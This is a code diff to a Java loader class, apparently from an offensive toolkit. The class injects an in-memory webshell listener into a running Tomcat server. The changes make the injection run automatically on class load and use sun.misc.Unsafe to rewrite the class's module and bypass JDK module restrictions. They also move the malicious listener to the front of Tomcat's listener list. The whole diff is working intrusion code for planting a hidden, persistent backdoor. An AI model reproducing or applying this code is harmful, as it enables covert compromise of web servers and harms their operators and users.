@@ -4,6 +4,7 @@ import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
+import sun.misc.Unsafe;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -27,6 +28,10 @@ public class TomcatListenerThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
 
+    static {
+        new TomcatListenerThreadLoader();
+    }
+
     public TomcatListenerThreadLoader() {
         try {
             // 获取 standardContext
@@ -47,6 +52,7 @@ public class TomcatListenerThreadLoader {
      * Tomcat Listener
      */
     public static void inject(Object standardContext) throws Exception {
+        addModule();
         Object[] applicationEventListenersObjects = null;
         List applicationEventListeners;
         Object object = getObject();
@@ -83,7 +89,15 @@ public class TomcatListenerThreadLoader {
         } else {
             // bypass
             List applicationEventListenersList = (List) getFieldValue(standardContext, "applicationEventListenersList");
-            applicationEventListenersList.add(object);
+            //
+//            applicationEventListenersList.add(object);
+
+            // 放到第一个
+            Object[] array = (Object[]) getFieldValue(applicationEventListenersList, "array");
+            Object[] newArray = new Object[array.length + 1];
+            newArray[0] = object;
+            System.arraycopy(array, 0, newArray, 1, array.length);
+            setFieldValue(applicationEventListenersList, "array", newArray);
 
             // 7 8 9 10
 //            invokeMethod(standardContext.getClass(), standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
@@ -221,5 +235,22 @@ public class TomcatListenerThreadLoader {
         return object;
     }
 
+    public static void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = TomcatListenerThreadLoader.class;
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Exception e) {
 
+        }
+    }
 }
